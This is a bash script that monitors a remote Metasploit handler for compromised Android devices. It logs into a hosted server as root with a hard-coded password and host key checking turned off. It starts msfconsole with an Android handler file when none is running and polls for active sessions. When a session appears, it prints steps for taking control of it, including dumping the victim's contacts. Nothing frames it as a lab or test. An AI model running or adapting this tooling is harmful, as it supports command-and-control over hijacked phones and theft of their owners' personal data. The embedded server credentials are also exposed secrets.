#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Railway SSH Configuration
RAILWAY_HOST="crossover.proxy.rlwy.net"
RAILWAY_PORT="55001"
RAILWAY_USER="root"
RAILWAY_PASS="8181"

echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   Metasploit Session Monitor v1.0     ║${NC}"
echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
echo ""

# Check if handler is running
echo -e "${YELLOW}[*] Checking handler status...${NC}"
HANDLER_STATUS=$(sshpass -p $RAILWAY_PASS ssh -o StrictHostKeyChecking=no -p $RAILWAY_PORT $RAILWAY_USER@$RAILWAY_HOST "ps aux | grep msfconsole | grep -v grep | wc -l" 2>/dev/null)

if [ "$HANDLER_STATUS" -gt 0 ]; then
    echo -e "${GREEN}[✓] Handler is running${NC}"
else
    echo -e "${RED}[✗] Handler is NOT running${NC}"
    echo -e "${YELLOW}[*] Starting handler...${NC}"
    sshpass -p $RAILWAY_PASS ssh -o StrictHostKeyChecking=no -p $RAILWAY_PORT $RAILWAY_USER@$RAILWAY_HOST \
        "nohup msfconsole -q -r /root/android_handler.rc > /tmp/handler.log 2>&1 &" 2>/dev/null
    sleep 5
    echo -e "${GREEN}[✓] Handler started${NC}"
fi

echo ""
echo -e "${BLUE}════════════════════════════════════════${NC}"
echo -e "${GREEN}Monitoring Sessions (Press Ctrl+C to stop)${NC}"
echo -e "${BLUE}════════════════════════════════════════${NC}"
echo ""

CHECK_COUNT=0
SESSION_FOUND=0

while true; do
    CHECK_COUNT=$((CHECK_COUNT + 1))
    TIMESTAMP=$(date '+%H:%M:%S')
    
    echo -e "${YELLOW}Check #$CHECK_COUNT - $TIMESTAMP${NC}"
    
    # Get sessions list
    SESSION_OUTPUT=$(sshpass -p $RAILWAY_PASS ssh -o StrictHostKeyChecking=no -p $RAILWAY_PORT $RAILWAY_USER@$RAILWAY_HOST \
        "msfconsole -q -x 'sessions -l; exit' 2>/dev/null" | grep -A10 "Active sessions")
    
    # Check if there are active sessions
    if echo "$SESSION_OUTPUT" | grep -q "No active sessions"; then
        echo -e "${RED}  ✗ No active sessions${NC}"
    else
        echo -e "${GREEN}  ✓ Active sessions found!${NC}"
        echo "$SESSION_OUTPUT"
        SESSION_FOUND=1
        
        # Alert sound (optional)
        echo -e "\a"
        
        echo ""
        echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  SESSION ESTABLISHED! What to do now: ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "${YELLOW}1. Connect to Railway:${NC}"
        echo "   ssh -p $RAILWAY_PORT $RAILWAY_USER@$RAILWAY_HOST"
        echo ""
        echo -e "${YELLOW}2. Interact with session:${NC}"
        echo "   msfconsole -q"
        echo "   sessions -i 1"
        echo ""
        echo -e "${YELLOW}3. Test commands:${NC}"
        echo "   sysinfo"
        echo "   pwd"
        echo "   ls"
        echo "   dump_contacts"
        echo ""
        
        # Continue monitoring or exit?
        read -t 10 -p "Continue monitoring? (Y/n): " CONTINUE
        if [[ "$CONTINUE" == "n" || "$CONTINUE" == "N" ]]; then
            echo -e "${BLUE}Monitoring stopped.${NC}"
            exit 0
        fi
    fi
    
    echo ""
    
    # Wait 10 seconds before next check
    sleep 10
done
